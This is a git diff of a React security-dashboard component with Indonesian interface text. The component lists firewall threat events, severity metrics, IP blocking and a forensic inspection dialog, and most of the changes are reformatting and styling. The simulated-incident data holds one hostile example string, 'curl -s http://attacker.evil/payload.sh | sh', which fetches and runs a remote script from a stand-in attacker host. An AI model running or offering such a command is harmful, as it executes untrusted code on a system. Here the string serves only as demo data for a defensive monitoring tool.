@@ -4,8 +4,22 @@ import * as React from "react"
 import { Badge } from "@/components/ui/badge"
 import { Button } from "@/components/ui/button"
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
-import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
-import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
+import {
+  Table,
+  TableBody,
+  TableCell,
+  TableHead,
+  TableHeader,
+  TableRow,
+} from "@/components/ui/table"
+import {
+  Dialog,
+  DialogContent,
+  DialogDescription,
+  DialogFooter,
+  DialogHeader,
+  DialogTitle,
+} from "@/components/ui/dialog"
 import { Input } from "@/components/ui/input"
 import {
   ShieldAlert,
@@ -16,11 +30,9 @@ import {
   Copy,
   Check,
   CheckCircle2,
-  AlertTriangle,
   Clock,
   Terminal,
   Shield,
-  Layers,
   FileCode2,
 } from "lucide-react"
 import { ThreatEvent, NodeTelemetry } from "@/lib/store"
@@ -37,7 +49,7 @@ export function ThreatsClient({
   currentRole = "Superadmin",
 }: ThreatsClientProps) {
   const [threats, setThreats] = React.useState<ThreatEvent[]>(initialThreats)
-  const [nodes, setNodes] = React.useState<NodeTelemetry[]>(initialNodes)
+  const [nodes] = React.useState<NodeTelemetry[]>(initialNodes)
   const [searchQuery, setSearchQuery] = React.useState("")
   const [severityFilter, setSeverityFilter] = React.useState("all")
   const [typeFilter, setTypeFilter] = React.useState("all")
@@ -45,7 +57,8 @@ export function ThreatsClient({
   const [copiedText, setCopiedText] = React.useState<string | null>(null)
 
   // Forensic Dialog
-  const [selectedThreat, setSelectedThreat] = React.useState<ThreatEvent | null>(null)
+  const [selectedThreat, setSelectedThreat] =
+    React.useState<ThreatEvent | null>(null)
   const [isForensicOpen, setIsForensicOpen] = React.useState(false)
   const [blockSuccess, setBlockSuccess] = React.useState<string | null>(null)
 
@@ -80,7 +93,9 @@ export function ThreatsClient({
         body: JSON.stringify({ ip }),
       })
       if (res.ok) {
-        setBlockSuccess(`IP ${ip} berhasil dimasukkan ke daftar cekal Kernel nftables!`)
+        setBlockSuccess(
+          `IP ${ip} berhasil dimasukkan ke daftar cekal Kernel nftables!`
+        )
         setTimeout(() => setBlockSuccess(null), 3000)
       }
     } catch (err) {
@@ -95,14 +110,16 @@ export function ThreatsClient({
       {
         type: "WAF_INSTANT_BLOCK",
         severity: "HIGH" as const,
-        pattern: "Zero-Day Command Injection (curl -s http://attacker.evil/payload.sh | sh)",
+        pattern:
+          "Zero-Day Command Injection (curl -s http://attacker.evil/payload.sh | sh)",
         ip: "185.220.101." + Math.floor(Math.random() * 250),
         url: "/api/v1/checkout?cmd=curl...",
       },
       {
         type: "FIM_MODIFICATION",
         severity: "CRITICAL" as const,
-        pattern: "File Integrity Tampering: /var/www/html/wp-config.php checksum mismatch",
+        pattern:
+          "File Integrity Tampering: /var/www/html/wp-config.php checksum mismatch",
         ip: "45.134.20." + Math.floor(Math.random() * 250),
         url: "/var/www/html/wp-config.php",
       },
@@ -161,7 +178,8 @@ export function ThreatsClient({
         t.event_type.toLowerCase().includes(q) ||
         t.node_id.toLowerCase().includes(q)
 
-      const matchSeverity = severityFilter === "all" || t.severity === severityFilter
+      const matchSeverity =
+        severityFilter === "all" || t.severity === severityFilter
       const matchType = typeFilter === "all" || t.event_type === typeFilter
 
       return matchSearch && matchSeverity && matchType
@@ -169,45 +187,53 @@ export function ThreatsClient({
   }, [threats, searchQuery, severityFilter, typeFilter])
 
   // Metric counts
-  const totalThreats = threats.length
-  const criticalThreats = threats.filter((t) => t.severity === "CRITICAL").length
+  const criticalThreats = threats.filter(
+    (t) => t.severity === "CRITICAL"
+  ).length
   const highThreats = threats.filter((t) => t.severity === "HIGH").length
-  const blockedCount = currentRole === "Superadmin" ? 1420 + threats.length : threats.length
+  const blockedCount =
+    currentRole === "Superadmin" ? 1420 + threats.length : threats.length
 
   return (
-    <div className="flex flex-col gap-6 py-2">
+    <div className="flex flex-col gap-6">
       {/* 1. Header */}
-      <div className="flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
-        <div>
-          <div className="flex items-center gap-2">
-            <h1 className="font-heading text-2xl font-black tracking-tight text-foreground sm:text-3xl">
+      <div className="flex flex-col gap-4 lg:flex-row lg:items-start lg:justify-between">
+        <div className="min-w-0 flex-1 space-y-1.5">
+          <div className="flex flex-wrap items-center gap-2.5">
+            <h1 className="font-heading text-2xl font-black tracking-tight text-balance text-foreground sm:text-3xl">
               Insiden Serangan &amp; Telemetri Forensik
             </h1>
-            <Badge variant="outline" className="border-rose-500/50 bg-rose-500/10 text-rose-500 font-mono text-xs animate-pulse">
+            <Badge
+              variant="outline"
+              className="animate-pulse border-rose-500/50 bg-rose-500/10 font-mono text-[11px] font-bold tracking-wider text-rose-500"
+            >
               LIVE FIREWALL FEED
             </Badge>
           </div>
-          <p className="mt-1 font-mono text-xs text-muted-foreground">
-            Audit waktu-nyata pencegahan eksploitasi, probe WAF, pemindaian port, dan deteksi manipulasi file sistem (FIM).
+          <p className="max-w-2xl font-sans text-sm leading-relaxed text-pretty text-muted-foreground">
+            Audit waktu-nyata pencegahan eksploitasi, probe WAF, pemindaian
+            port, dan deteksi manipulasi file sistem (FIM).
           </p>
         </div>
 
-        <div className="flex items-center gap-2">
+        <div className="flex shrink-0 flex-wrap items-center gap-2">
           <Button
             variant="outline"
             size="sm"
             onClick={refreshData}
             disabled={isLoading}
-            className="border-2 font-mono text-xs"
+            className="h-9 border-2 font-mono text-xs whitespace-nowrap"
           >
-            <RefreshCw className={`mr-1.5 size-3.5 ${isLoading ? "animate-spin" : ""}`} />
+            <RefreshCw
+              className={`mr-1.5 size-3.5 ${isLoading ? "animate-spin" : ""}`}
+            />
             Sinkronkan
           </Button>
           <Button
             size="sm"
             onClick={simulateIncident}
             disabled={isLoading}
-            className="border-2 bg-rose-600 hover:bg-rose-700 text-white font-heading text-xs font-black shadow-[3px_3px_0px_0px_var(--border)]"
+            className="h-9 border-2 bg-rose-600 font-heading text-xs font-black whitespace-nowrap text-white shadow-[3px_3px_0px_0px_var(--border)] hover:bg-rose-700"
           >
             <Flame className="mr-1.5 size-4" />
             Simulasi Serangan Baru
@@ -226,14 +252,16 @@ export function ThreatsClient({
       <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
         <Card className="border-2 shadow-[3px_3px_0px_0px_var(--border)]">
           <CardContent className="p-4">
-            <div className="flex items-center justify-between">
-              <span className="font-mono text-xs text-muted-foreground">TOTAL SERANGAN DICEKAL</span>
-              <ShieldAlert className="size-4 text-rose-500" />
+            <div className="flex items-center justify-between gap-2">
+              <span className="font-mono text-[11px] font-bold tracking-wider text-muted-foreground uppercase">
+                TOTAL SERANGAN DICEKAL
+              </span>
+              <ShieldAlert className="size-4 shrink-0 text-rose-500" />
             </div>
-            <div className="mt-2 font-mono text-2xl font-black text-rose-500">
+            <div className="mt-2 font-mono text-2xl font-black text-rose-500 tabular-nums">
               {blockedCount}
             </div>
-            <p className="mt-1 font-mono text-[11px] text-muted-foreground">
+            <p className="mt-1 font-sans text-xs text-muted-foreground">
               Drop otomatis di level Linux Kernel
             </p>
           </CardContent>
@@ -241,14 +269,16 @@ export function ThreatsClient({
 
         <Card className="border-2 shadow-[3px_3px_0px_0px_var(--border)]">
           <CardContent className="p-4">
-            <div className="flex items-center justify-between">
-              <span className="font-mono text-xs text-muted-foreground">LEVEL KRITIS (FIM/RCE)</span>
-              <Flame className="size-4 text-amber-500" />
+            <div className="flex items-center justify-between gap-2">
+              <span className="font-mono text-[11px] font-bold tracking-wider text-muted-foreground uppercase">
+                LEVEL KRITIS (FIM/RCE)
+              </span>
+              <Flame className="size-4 shrink-0 text-amber-500" />
             </div>
-            <div className="mt-2 font-mono text-2xl font-black text-amber-500">
+            <div className="mt-2 font-mono text-2xl font-black text-amber-500 tabular-nums">
               {criticalThreats}
             </div>
-            <p className="mt-1 font-mono text-[11px] text-muted-foreground">
+            <p className="mt-1 font-sans text-xs text-muted-foreground">
               Integritas file &amp; injeksi perintah
             </p>
           </CardContent>
@@ -256,14 +286,16 @@ export function ThreatsClient({
 
         <Card className="border-2 shadow-[3px_3px_0px_0px_var(--border)]">
           <CardContent className="p-4">
-            <div className="flex items-center justify-between">
-              <span className="font-mono text-xs text-muted-foreground">WAF EXPLOIT BLOCKED</span>
-              <Shield className="size-4 text-main" />
+            <div className="flex items-center justify-between gap-2">
+              <span className="font-mono text-[11px] font-bold tracking-wider text-muted-foreground uppercase">
+                WAF EXPLOIT BLOCKED
+              </span>
+              <Shield className="size-4 shrink-0 text-main" />
             </div>
-            <div className="mt-2 font-mono text-2xl font-black text-main">
+            <div className="mt-2 font-mono text-2xl font-black text-main tabular-nums">
               {highThreats}
             </div>
-            <p className="mt-1 font-mono text-[11px] text-muted-foreground">
+            <p className="mt-1 font-sans text-xs text-muted-foreground">
               SQLi, XSS, Path Traversal
             </p>
           </CardContent>
@@ -271,14 +303,16 @@ export function ThreatsClient({
 
         <Card className="border-2 shadow-[3px_3px_0px_0px_var(--border)]">
           <CardContent className="p-4">
-            <div className="flex items-center justify-between">
-              <span className="font-mono text-xs text-muted-foreground">WAKTU RESPON KERNEL</span>
-              <Clock className="size-4 text-emerald-500" />
+            <div className="flex items-center justify-between gap-2">
+              <span className="font-mono text-[11px] font-bold tracking-wider text-muted-foreground uppercase">
+                WAKTU RESPON KERNEL
+              </span>
+              <Clock className="size-4 shrink-0 text-emerald-500" />
             </div>
-            <div className="mt-2 font-mono text-2xl font-black text-emerald-500">
+            <div className="mt-2 font-mono text-2xl font-black text-emerald-500 tabular-nums">
               &lt; 0.2 ms
             </div>
-            <p className="mt-1 font-mono text-[11px] text-muted-foreground">
+            <p className="mt-1 font-sans text-xs text-muted-foreground">
               nftables hardware offload
             </p>
           </CardContent>
@@ -290,12 +324,12 @@ export function ThreatsClient({
         <CardContent className="p-4">
           <div className="flex flex-col gap-3 md:flex-row md:items-center md:justify-between">
             <div className="relative flex-1">
-              <Search className="absolute left-3 top-1/2 size-4 -translate-y-1/2 text-muted-foreground" />
+              <Search className="absolute top-1/2 left-3 size-4 -translate-y-1/2 text-muted-foreground" />
               <Input
                 placeholder="Cari IP penyerang, pola ancaman, target URL, atau ID node..."
                 value={searchQuery}
                 onChange={(e) => setSearchQuery(e.target.value)}
-                className="pl-9 font-mono text-xs"
+                className="h-9 border-2 border-border bg-background pl-9 font-mono text-xs"
               />
             </div>
 
@@ -337,11 +371,11 @@ export function ThreatsClient({
 
       {/* 4. Table of Threat Events */}
       <Card className="border-2 shadow-[4px_4px_0px_0px_var(--border)]">
-        <CardHeader className="border-b-2 border-border/80 bg-muted/20 px-6 py-4">
-          <div className="flex items-center justify-between">
+        <CardHeader className="border-b-2 border-border/80 bg-muted/20 px-5 py-4">
+          <div className="flex flex-wrap items-center justify-between gap-2">
             <div className="flex items-center gap-2">
               <ShieldAlert className="size-5 text-rose-500" />
-              <CardTitle className="font-heading text-lg font-black text-foreground">
+              <CardTitle className="font-heading text-lg font-black text-foreground tabular-nums">
                 Stream Log Insiden Terkini ({filteredThreats.length})
               </CardTitle>
             </div>
@@ -355,70 +389,106 @@ export function ThreatsClient({
             <Table>
               <TableHeader>
                 <TableRow className="border-b-2 border-border bg-muted/30">
-                  <TableHead className="font-mono text-xs font-bold text-foreground">WAKTU (WIB)</TableHead>
-                  <TableHead className="font-mono text-xs font-bold text-foreground">SEVERITY &amp; TIPE</TableHead>
-                  <TableHead className="font-mono text-xs font-bold text-foreground">IP PENYERANG</TableHead>
-                  <TableHead className="font-mono text-xs font-bold text-foreground">TARGET &amp; POLA SERANGAN</TableHead>
-                  <TableHead className="font-mono text-xs font-bold text-foreground">TINDAKAN MITIGASI</TableHead>
-                  <TableHead className="font-mono text-xs font-bold text-foreground text-right">FORENSIK</TableHead>
+                  <TableHead className="px-2.5 font-mono text-[11px] font-bold tracking-wider text-foreground">
+                    WAKTU
+                  </TableHead>
+                  <TableHead className="px-2.5 font-mono text-[11px] font-bold tracking-wider text-foreground">
+                    SEVERITY
+                  </TableHead>
+                  <TableHead className="px-2.5 font-mono text-[11px] font-bold tracking-wider text-foreground">
+                    IP PENYERANG
+                  </TableHead>
+                  <TableHead className="px-2.5 font-mono text-[11px] font-bold tracking-wider text-foreground">
+                    TARGET &amp; POLA
+                  </TableHead>
+                  <TableHead className="px-2.5 font-mono text-[11px] font-bold tracking-wider text-foreground">
+                    MITIGASI
+                  </TableHead>
+                  <TableHead className="px-2.5 text-right font-mono text-[11px] font-bold tracking-wider text-foreground">
+                    FORENSIK
+                  </TableHead>
                 </TableRow>
               </TableHeader>
               <TableBody>
                 {filteredThreats.length === 0 ? (
                   <TableRow>
-                    <TableCell colSpan={6} className="py-8 text-center font-mono text-xs text-muted-foreground">
-                      Tidak ada insiden serangan yang cocok dengan kriteria filter.
+                    <TableCell
+                      colSpan={6}
+                      className="py-8 text-center font-mono text-xs text-muted-foreground"
+                    >
+                      Tidak ada insiden serangan yang cocok dengan kriteria
+                      filter.
                     </TableCell>
                   </TableRow>
                 ) : (
                   filteredThreats.map((threat) => {
-                    const attackerIp = threat.details?.attacker_ip || "198.51.100.42"
+                    const attackerIp =
+                      threat.details?.attacker_ip || "198.51.100.42"
                     const date = new Date(threat.timestamp * 1000)
-                    const timeStr = date.toLocaleTimeString("id-ID", { hour12: false })
-                    const dateStr = date.toLocaleDateString("id-ID", { day: "2-digit", month: "short" })
+                    const timeStr = date.toLocaleTimeString("id-ID", {
+                      hour12: false,
+                    })
+                    const dateStr = date.toLocaleDateString("id-ID", {
+                      day: "2-digit",
+                      month: "short",
+                    })
 
-                    const matchedNode = nodes.find((n) => n.node_id === threat.node_id)
+                    const matchedNode = nodes.find(
+                      (n) => n.node_id === threat.node_id
+                    )
 
                     return (
-                      <TableRow key={threat.id} className="border-b border-border/60 hover:bg-muted/10 transition-colors">
+                      <TableRow
+                        key={threat.id}
+                        className="border-b border-border/60 transition-colors hover:bg-muted/10"
+                      >
                         {/* 1. Time */}
-                        <TableCell className="font-mono text-xs">
+                        <TableCell className="px-2.5 py-2.5 font-mono text-xs">
                           <div className="flex flex-col">
-                            <span className="font-bold text-foreground">{timeStr}</span>
-                            <span className="text-[10px] text-muted-foreground">{dateStr}</span>
+                            <span className="font-bold text-foreground tabular-nums">
+                              {timeStr}
+                            </span>
+                            <span className="text-[10px] text-muted-foreground">
+                              {dateStr}
+                            </span>
                             <span className="text-[9px] text-muted-foreground/70">
-                              Node: {matchedNode ? matchedNode.hostname : threat.node_id.slice(-6)}
+                              Node:{" "}
+                              {matchedNode
+                                ? matchedNode.hostname
+                                : threat.node_id.slice(-6)}
                             </span>
                           </div>
                         </TableCell>
 
                         {/* 2. Severity & Type */}
-                        <TableCell>
-                          <div className="flex flex-col gap-1 items-start">
+                        <TableCell className="max-w-[135px] px-2.5 py-2.5 whitespace-normal">
+                          <div className="flex flex-col items-start gap-1">
                             <Badge
-                              className={`font-mono text-[9px] font-bold ${
+                              className={`font-mono text-[9px] font-bold tracking-wider ${
                                 threat.severity === "CRITICAL"
-                                  ? "bg-rose-500 text-white border-rose-600 animate-pulse"
+                                  ? "animate-pulse border-rose-600 bg-rose-500 text-white"
                                   : threat.severity === "HIGH"
-                                  ? "bg-amber-500 text-black border-amber-600"
-                                  : threat.severity === "WARNING"
-                                  ? "bg-yellow-400 text-black border-yellow-500"
-                                  : "bg-muted text-foreground border-border"
+                                    ? "border-amber-600 bg-amber-500 text-black"
+                                    : threat.severity === "WARNING"
+                                      ? "border-yellow-500 bg-yellow-400 text-black"
+                                      : "border-border bg-muted text-foreground"
                               }`}
                             >
                               {threat.severity}
                             </Badge>
-                            <span className="font-mono text-[10px] text-muted-foreground font-semibold">
+                            <span className="truncate font-mono text-[10px] font-semibold text-muted-foreground">
                               {threat.event_type}
                             </span>
                           </div>
                         </TableCell>
 
                         {/* 3. Attacker IP */}
-                        <TableCell className="font-mono text-xs">
+                        <TableCell className="px-2.5 py-2.5 font-mono text-xs">
                           <div className="flex flex-col gap-1">
                             <div className="flex items-center gap-1.5">
-                              <span className="font-bold text-foreground">{attackerIp}</span>
+                              <span className="font-bold text-foreground tabular-nums">
+                                {attackerIp}
+                              </span>
                               <button
                                 onClick={() => handleCopy(attackerIp)}
                                 title="Salin IP"
@@ -433,27 +503,31 @@ export function ThreatsClient({
                             </div>
                             <button
                               onClick={() => handleQuickBlock(attackerIp)}
-                              className="text-[10px] font-bold text-rose-500 hover:underline flex items-center gap-1 w-fit"
+                              className="flex w-fit items-center gap-1 text-[10px] font-bold text-rose-500 hover:underline"
                             >
                               <Shield className="size-2.5" />
-                              <span>+ Cekal di Firewall</span>
+                              <span>+ Cekal IP</span>
                             </button>
                           </div>
                         </TableCell>
 
                         {/* 4. Target & Pattern */}
-                        <TableCell className="font-mono text-xs max-w-[320px]">
+                        <TableCell className="max-w-[230px] px-2.5 py-2.5 font-mono text-xs whitespace-normal">
                           <div className="flex flex-col gap-0.5">
-                            <span className="font-semibold text-foreground truncate" title={threat.details?.attack_pattern}>
-                              {threat.details?.attack_pattern || "Pola penyerangan terdeteksi"}
+                            <span
+                              className="truncate font-semibold text-foreground"
+                              title={threat.details?.attack_pattern}
+                            >
+                              {threat.details?.attack_pattern ||
+                                "Pola penyerangan terdeteksi"}
                             </span>
                             {threat.details?.url && (
-                              <code className="text-[10px] text-muted-foreground bg-muted/40 px-1 py-0.5 rounded truncate">
+                              <code className="truncate rounded bg-muted/40 px-1 py-0.5 text-[10px] text-muted-foreground">
                                 {threat.details.url}
                               </code>
                             )}
                             {threat.details?.file_path && (
-                              <span className="text-[10px] text-amber-500 font-semibold truncate">
+                              <span className="truncate text-[10px] font-semibold text-amber-500">
                                 File: {threat.details.file_path}
                               </span>
                             )}
@@ -461,14 +535,24 @@ export function ThreatsClient({
                         </TableCell>
 
                         {/* 5. Mitigation */}
-                        <TableCell className="font-mono text-xs">
-                          <Badge variant="outline" className="border-emerald-500/40 bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 font-mono text-[10px] font-bold">
-                            {threat.details?.mitigation_action_taken || "NFTABLES_DROP_ACTIVE"}
+                        <TableCell className="max-w-[180px] px-2.5 py-2.5 font-mono text-xs whitespace-normal">
+                          <Badge
+                            variant="outline"
+                            title={
+                              threat.details?.mitigation_action_taken ||
+                              "NFTABLES_DROP_ACTIVE"
+                            }
+                            className="max-w-full border-emerald-500/40 bg-emerald-500/10 font-mono text-[10px] font-bold text-emerald-600 dark:text-emerald-400"
+                          >
+                            <span className="truncate">
+                              {threat.details?.mitigation_action_taken ||
+                                "NFTABLES_DROP_ACTIVE"}
+                            </span>
                           </Badge>
                         </TableCell>
 
                         {/* 6. Forensics Action */}
-                        <TableCell className="text-right">
+                        <TableCell className="px-2.5 py-2.5 text-right">
                           <Button
                             variant="outline"
                             size="sm"
@@ -476,7 +560,7 @@ export function ThreatsClient({
                               setSelectedThreat(threat)
                               setIsForensicOpen(true)
                             }}
-                            className="font-mono text-xs border-2"
+                            className="h-8 border-2 px-2.5 font-mono text-xs whitespace-nowrap"
                           >
                             <FileCode2 className="mr-1 size-3.5" />
                             Inspeksi
@@ -494,61 +578,107 @@ export function ThreatsClient({
 
       {/* 5. MODAL DETAIL FORENSIK */}
       <Dialog open={isForensicOpen} onOpenChange={setIsForensicOpen}>
-        <DialogContent className="max-w-2xl border-2">
-          <DialogHeader>
-            <DialogTitle className="font-heading text-lg font-black text-foreground flex items-center gap-2">
-              <Terminal className="size-5 text-rose-500" />
-              <span>Inspeksi Forensik Insiden #{selectedThreat?.id}</span>
-            </DialogTitle>
-            <DialogDescription className="font-mono text-xs">
-              Detail payload mentah, jejak mitigasi kernel Linux, dan analisis pola ancaman.
-            </DialogDescription>
+        <DialogContent className="max-w-2xl">
+          <DialogHeader className="border-b border-border/70 pb-4">
+            <div className="flex items-center gap-3">
+              <div className="flex size-9 shrink-0 items-center justify-center rounded-base border-2 border-border bg-rose-500/15 text-rose-500 shadow-[2px_2px_0px_0px_var(--border)]">
+                <Terminal className="size-4.5" />
+              </div>
+              <div className="min-w-0">
+                <DialogTitle>
+                  Inspeksi Forensik Insiden #{selectedThreat?.id}
+                </DialogTitle>
+                <DialogDescription className="mt-1">
+                  Detail payload mentah, jejak mitigasi kernel Linux, dan
+                  analisis pola ancaman.
+                </DialogDescription>
+              </div>
+            </div>
           </DialogHeader>
 
           {selectedThreat && (
-            <div className="space-y-4 py-2 font-mono text-xs">
-              <div className="grid grid-cols-2 gap-3 p-3 rounded-base bg-muted/20 border border-border">
+            <div className="space-y-4 font-mono text-xs">
+              <div className="grid grid-cols-1 gap-3 rounded-base border-2 border-border bg-muted/20 p-3.5 sm:grid-cols-2">
                 <div>
-                  <span className="text-muted-foreground text-[10px]">TIPE INSIDEN:</span>
-                  <div className="font-bold text-foreground">{selectedThreat.event_type}</div>
-                </div>
-                <div>
-                  <span className="text-muted-foreground text-[10px]">TINGKAT SEVERITY:</span>
-                  <div className="font-bold text-rose-500">{selectedThreat.severity}</div>
-                </div>
-                <div>
-                  <span className="text-muted-foreground text-[10px]">IP PENYERANG:</span>
-                  <div className="font-bold text-foreground">{selectedThreat.details?.attacker_ip || "N/A"}</div>
-                </div>
-                <div>
-                  <span className="text-muted-foreground text-[10px]">WAKTU KEJADIAN:</span>
+                  <span className="text-[10px] text-muted-foreground">
+                    TIPE INSIDEN:
+                  </span>
                   <div className="font-bold text-foreground">
-                    {new Date(selectedThreat.timestamp * 1000).toLocaleString("id-ID")}
+                    {selectedThreat.event_type}
+                  </div>
+                </div>
+                <div>
+                  <span className="text-[10px] text-muted-foreground">
+                    TINGKAT SEVERITY:
+                  </span>
+                  <div className="font-bold text-rose-500">
+                    {selectedThreat.severity}
+                  </div>
+                </div>
+                <div>
+                  <span className="text-[10px] text-muted-foreground">
+                    IP PENYERANG:
+                  </span>
+                  <div className="font-bold text-foreground tabular-nums">
+                    {selectedThreat.details?.attacker_ip || "N/A"}
+                  </div>
+                </div>
+                <div>
+                  <span className="text-[10px] text-muted-foreground">
+                    WAKTU KEJADIAN:
+                  </span>
+                  <div className="font-bold text-foreground tabular-nums">
+                    {new Date(selectedThreat.timestamp * 1000).toLocaleString(
+                      "id-ID"
+                    )}
                   </div>
                 </div>
               </div>
 
-              <div>
-                <span className="font-bold text-foreground block mb-1">Raw Forensics JSON Payload:</span>
-                <pre className="p-3 rounded-base bg-black/90 text-emerald-400 text-xs overflow-x-auto max-h-56 border-2 border-border select-all">
+              <div className="space-y-1.5">
+                <div className="flex items-center justify-between">
+                  <span className="font-sans text-xs font-bold text-foreground">
+                    Raw Forensics JSON Payload:
+                  </span>
+                  <button
+                    type="button"
+                    onClick={() =>
+                      handleCopy(
+                        JSON.stringify(selectedThreat.details || {}, null, 2)
+                      )
+                    }
+                    className="inline-flex items-center gap-1 text-[11px] font-bold text-main hover:underline"
+                  >
+                    <Copy className="size-3" />
+                    <span>Salin JSON</span>
+                  </button>
+                </div>
+                <pre className="max-h-56 overflow-x-auto rounded-base border-2 border-border bg-black/95 p-3 text-xs text-emerald-400 select-all">
                   {JSON.stringify(selectedThreat.details || {}, null, 2)}
                 </pre>
               </div>
 
-              <div className="flex items-center justify-between pt-2 border-t border-border">
+              <DialogFooter className="sm:justify-between">
                 <Button
                   variant="outline"
                   size="sm"
-                  onClick={() => selectedThreat.details?.attacker_ip && handleQuickBlock(selectedThreat.details.attacker_ip)}
-                  className="font-mono text-xs text-rose-500 border-rose-500/40 hover:bg-rose-500/10"
+                  onClick={() =>
+                    selectedThreat.details?.attacker_ip &&
+                    handleQuickBlock(selectedThreat.details.attacker_ip)
+                  }
+                  className="h-9 border-2 border-rose-500/40 font-mono text-xs text-rose-500 hover:bg-rose-500/10"
                 >
-                  <Shield className="mr-1 size-3.5" />
+                  <Shield className="mr-1.5 size-3.5" />
                   Cekal IP {selectedThreat.details?.attacker_ip}
                 </Button>
-                <Button size="sm" onClick={() => setIsForensicOpen(false)} className="bg-main text-black font-heading font-black">
+                <Button
+                  size="sm"
+                  onClick={() => setIsForensicOpen(false)}
+                  className="h-9 border-2 border-border bg-main font-heading text-xs font-black text-black shadow-[2px_2px_0px_0px_var(--border)] hover:bg-main/90"
+                >
                   Tutup Forensik
                 </Button>
-              </div>
+              </DialogFooter>
             </div>
           )}
         </DialogContent>
